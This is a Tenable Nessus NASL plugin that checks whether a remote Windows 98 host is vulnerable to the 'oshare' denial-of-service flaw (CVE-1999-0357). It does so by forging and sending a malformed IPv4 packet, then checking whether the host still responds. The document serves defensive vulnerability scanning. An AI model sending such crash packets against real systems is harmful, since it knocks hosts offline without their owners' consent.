#
# (C) Tenable Network Security, Inc.
#

# This attack is very unlikely to work from a large number
# of systems which check ip->ip_len before sending the packets.
#

include("compat.inc");

if (description)
{
 script_id(10170);
 script_version("$Revision: 1.24 $");
 script_cvs_date("$Date: 2014/05/26 01:50:29 $");

 script_cve_id("CVE-1999-0357");
 script_osvdb_id(11453);

 script_name(english:"Microsoft Windows 98 Malformed oshare Packet DoS");
 script_summary(english:"Crashes the remote host using the 'oshare' attack");

 script_set_attribute(attribute:"synopsis", value:"The remote host is vulnerable to a denial of service.");
 script_set_attribute(attribute:"description", value:
"It was possible to crash the remote system using the 'oshare' attack.

An attacker may use this problem to prevent your site from working
properly.");
 script_set_attribute(attribute:"solution", value:"Contact your vendor for a patch.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");

 script_set_attribute(attribute:"vuln_publication_date", value:"1999/01/25");
 script_set_attribute(attribute:"plugin_publication_date", value:"1999/07/29");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_KILL_HOST);
 script_copyright(english:"This script is Copyright (C) 1999-2014 Tenable Network Security, Inc.");
 script_family(english:"Windows");

 script_require_keys("Settings/ParanoidReport");

 exit(0);
}

include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

if ( TARGET_IS_IPV6 ) exit(0);
ip = forge_ip_packet(ip_v : 4, ip_len : 44, ip_hl : 11,
		     ip_tos : 0, ip_id : rand(), ip_off : 16383,
		     ip_ttl : 0xFF, ip_p : IPPROTO_UDP,
		     ip_src : this_host());

start_denial();
send_packet(ip, pcap_active:FALSE);

alive = end_denial();
if(!alive){
		security_hole(0);
		set_kb_item(name:"Host/dead", value:TRUE);
	  }

